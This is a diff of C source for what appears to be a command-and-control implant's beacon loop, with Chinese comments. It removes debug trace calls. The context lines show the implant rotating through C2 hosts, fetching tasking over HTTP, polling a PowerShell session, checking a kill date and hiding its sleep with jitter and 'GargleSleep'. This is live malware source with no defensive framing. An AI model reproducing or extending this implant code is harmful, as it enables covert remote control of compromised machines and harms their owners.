@@ -9,7 +9,6 @@
 #include "parse.h"
 #include "bformat.h"
 #include "track_memory.h"
-#include "x86trace.h"
 
 #define MAX_GET setting_int(SETTING_MAXGET)
 
@@ -143,10 +142,8 @@ void beacon(LPVOID lpReserved) {
 
 	/* 初始化代理 */
 	agent_init(buffer, MAX_GET);
-	x86_bc("ainit");
 
 	while (sleep_time > 0) {
-		x86_bc("loop");
 		// dlog("beacon.beacon - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n");
 
 		_snprintf(beacon_domain, 128, "%s", next_host(hosts, failedHost, &strategyInfo));
@@ -161,13 +158,10 @@ void beacon(LPVOID lpReserved) {
 
 		/* 执行协议的HTTP部分 */
 		// dlog("beacon.beacon - http_init: %s \n", beacon_domain);
-		x86_bc("i0");
 		http_init(beacon_domain, port, ua);
-		x86_bc("i1");
 
 		// dlog("beacon.beacon - http_get: %s \n", url);
 		length = http_get(url, &bigsession, buffer, MAX_GET);
-		x86_bc("get");
 
 		/* 这是在处理之前解密和验证有效载荷的适当时机 */
 		if (length > 0) {
@@ -210,7 +204,6 @@ void beacon(LPVOID lpReserved) {
 
 			/* 检查我们的powershell实例 */
 			psh_poll(command_shell_callback, MAX_PACKET);
-			x86_bc("polls");
 
 			/* 检查终止日期 */
 			if (check_kill_date())
@@ -232,9 +225,7 @@ void beacon(LPVOID lpReserved) {
 			failedHost = TRUE;
 		}
 
-		x86_bc("c0");
 		http_close();
-		x86_bc("c1");
 
 		/* 再次检查终止日期 */
 		if (check_kill_date())
@@ -247,9 +238,7 @@ void beacon(LPVOID lpReserved) {
 		/* 需要休眠多久？ */
 		if (sleep_time > 0) {
 			if (jitter == 0) {
-				x86_bc("s0");
 				GargleSleep(sleep_time);
-				x86_bc("s1");
 			}
 			else {
 			    unsigned int sxjd100 = ((sleep_time * jitter) / 100);
